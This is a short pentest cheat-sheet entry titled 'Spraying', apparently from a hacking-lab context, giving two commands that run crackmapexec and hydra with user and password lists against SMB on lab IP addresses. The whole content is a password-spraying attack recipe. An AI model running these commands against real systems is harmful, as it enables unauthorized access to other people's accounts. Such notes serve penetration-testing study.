# Spraying

```
crackmapexec smb 10.10.10.172 -u users.lst -p passwd.lst
hydra -L users.lst -P passwd.lst 10.10.10.193 smb
```

